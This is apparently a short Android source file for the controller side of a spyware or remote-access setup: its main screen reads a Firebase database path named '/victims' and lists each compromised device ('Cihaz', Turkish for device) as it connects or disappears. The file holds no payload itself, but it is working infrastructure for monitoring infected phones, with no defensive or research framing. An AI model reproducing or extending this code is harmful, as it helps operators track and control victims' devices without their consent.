package com.analiz.merkezi;
import android.app.Activity;
import android.os.Bundle;
import android.widget.*;
import com.firebase.client.*;
import java.util.ArrayList;

public class MainActivity extends Activity {
    private Firebase mRef;
    private ListView listView;
    private ArrayList<String> victimList = new ArrayList<String>();
    private ArrayAdapter<String> adapter;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        Firebase.setAndroidContext(this);
        
        listView = new ListView(this);
        adapter = new ArrayAdapter<String>(this, android.R.layout.simple_list_item_1, victimList);
        listView.setAdapter(adapter);
        setContentView(listView);

        mRef = new Firebase("https://ana-makine-default-rtdb.firebaseio.com/victims");
        mRef.addChildEventListener(new ChildEventListener() {
            @Override
            public void onChildAdded(DataSnapshot snapshot, String s) {
                victimList.add("Cihaz: " + snapshot.getKey());
                adapter.notifyDataSetChanged();
            }
            @Override public void onChildChanged(DataSnapshot s, String p) {}
            @Override public void onChildRemoved(DataSnapshot s) {
                victimList.remove("Cihaz: " + s.getKey());
                adapter.notifyDataSetChanged();
            }
            @Override public void onChildMoved(DataSnapshot s, String p) {}
            @Override public void onCancelled(FirebaseError e) {}
        });
    }
}
